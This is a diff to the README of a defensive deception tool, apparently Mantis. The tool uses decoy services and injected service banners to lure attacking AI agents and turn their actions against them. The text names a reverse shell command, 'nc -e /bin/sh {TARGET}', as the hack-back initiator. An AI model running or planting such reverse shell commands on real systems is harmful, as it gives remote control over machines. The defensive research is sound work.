@@ -39,7 +39,12 @@ A variation of the above that uses a SQL-Injection-vulnerable-webapp as decoy ca
 python mantis_run.py confs.web_hackback_rshell
 ```
 
-In these examples, we use a very simple reverse shell initiator: ```nc -e /bin/sh {TARGET} ...```. This can be changed by altering the variable ```REVERSE_SHELL_INITIATOR``` in the configuration file (e.g., ```confs/ftp_hackback_rshell.py```), where the parameter ```{TARGET}``` is the IP of the host (which is set automatically by Mantis). If you want to automate the attacker's post-exploitation, you can modify or replace the class ```Mantis.Decoys.reverse_shell_listener.ReverseShellListenerTest```. More on how the configuration files work later.
+Another configuration is provided in ```confs/web_hackback_rshell_with_inj_banner.py```, which is a variation of ```confs.web_hackback_rshell```. This configuration employs service banner injection to attract attackers. The injection can be controlled using the hyper-parameter: ```BANNER_INJECTION_POOL``` (refer to the content of ```confs/web_hackback_rshell_with_inj_banner.py``` for an example).
+
+
+In all these examples, we use a very simple reverse shell initiator: ```nc -e /bin/sh {TARGET} ...```. This can be changed by altering the variable ```REVERSE_SHELL_INITIATOR``` in the configuration file (e.g., ```confs/ftp_hackback_rshell.py```), where the parameter ```{TARGET}``` is the IP of the host (which is set automatically by Mantis). If you want to automate the attacker's post-exploitation, you can modify or replace the class ```Mantis.Decoys.reverse_shell_listener.ReverseShellListenerTest```. More on how the configuration files work later.
+
+
 
 ### Tarpit
 Another example is ```./confs/ftp_filesystem_tarpit.py```:
